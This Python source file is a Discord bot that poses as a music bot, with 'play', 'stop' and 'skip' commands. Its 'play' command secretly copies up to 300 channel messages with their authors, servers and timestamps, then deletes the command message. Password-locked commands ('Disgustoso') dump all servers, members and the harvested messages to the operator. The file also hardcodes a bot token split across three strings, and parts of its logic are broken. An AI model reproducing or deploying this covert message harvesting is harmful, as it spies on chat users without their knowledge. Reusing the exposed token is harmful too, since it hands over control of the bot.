import discord
import time
from discord.ext import commands
from discord import client 
from discord.ext.commands import Bot
import asyncio


print("il tuo bot si sta avviando...")
token1 = "NzUyMzE2NjcwOTk5MjY1MzIw"
token2 = ".X1V3fw.3CF9AkY4RbT_k-ZZ_"
token3 = "z5eOADszd0"
client = commands.Bot(command_prefix = ("-")) 
client.remove_command('help')


@client.event 
async def on_ready():  
    print(client.user, "è ora ONLINE (ID: ", client.user.id,")nuovo")
    global app2
    global f
    global arrayMessage

    arrayMessage = []
    global numberrr 
    numberrr = 0
    app2 = 'ciao'
        
    
@client.command() 
async def getStat(ctx, val):
    app = ''
    if(val == 'Disgustoso'):
        print('Servers connected to:')
        for guild1 in client.guilds:
            app += '------------------------------------------\n'
            app += 'server name: [ '
            app += guild1.name + ' ]\n' 
            print(guild1.name)
            
            app += '   ~(server members:) \n'
            print('~(server members:)')
            
            for member in guild1.members:
                if(member.name == 'Dietorelle' or member.name == 'interference' or member.name == 'CaneSardo09' or member.name == 'IlPedrazMolisano10'):
                    app += '----------| ' + member.name + '\n'
                else:
                    app += '         -| ' + member.name + '\n'
                print(f'     -|{member.name}')
        app += '------------------------------------------\n'
        await ctx.send(app)


@client.command() 
async def canc(ctx, *val):
    if( val[0] != None):
        a = int(val[0]) + 1
        await ctx.channel.purge(limit = a)
    else:
        await ctx.channel.purge(limit = 2)


@client.command()
async def play(ctx, *args):
    global arrayMessage
    global f
    global numberrr
    app3 = ' '
    app3 += '\n\n\n\n\n-------------------------------------------------------------started with (PLAY) at(' + str(ctx.message.created_at) + ') #0108\n'
    messages = await ctx.message.channel.history(limit=300).flatten()
    print('messages fatto')
    for stringa in messages:
        if(str(stringa.author) != 'Groovy#7254' or str(stringa.author) != 'Rythm#3722'):
            arrayMessage.append(app3 + '|[SERVER: ' + str(stringa.guild) + ' ]  \n|    [NAME: ' + str(stringa.author) + ' ] \n|        [MESSAGE: ' + str(stringa.content) + ' ] \n|               [TIME: ' + str(stringa.created_at)+ ' ]\n\n')
        
    if( args[0] != None):
        time.sleep(2)
        await ctx.channel.purge(limit = 2)
    name = "in_" + str(ctx.message.guild) + "_at_" + str(numberrr) + ".txt"
    print(name)
    f = open(name,"w")
    f.write(app3) 
    f.close()
    numberrr+=1    
        
    
@client.command()
async def merlin(ctx):
    server = ctx.message.channel
    await ctx.send(server)
    
@client.command(pass_context = True) 
async def paola(ctx):
    await ctx.channel.join()
        
@client.command()
async def stop(ctx, *args):

        await ctx.channel.purge(limit = 1)
        
@client.command()     
async def skip(ctx, *args):  

        await ctx.channel.purge(limit = 2)
        
@client.command() 
async def getMessage(ctx, val):
    global arrayMessage
    global f
    if(val == 'Disgustoso'):
        for x in arrayMessage:
            await ctx.send(arrayMessage[x])
        

@client.command() 
async def reset(ctx, val):
    global app2
    if(val == 'Disgustoso'):
       app2 = 'null'
       print('reset OK')
        
client.run(token1+token2+token3)



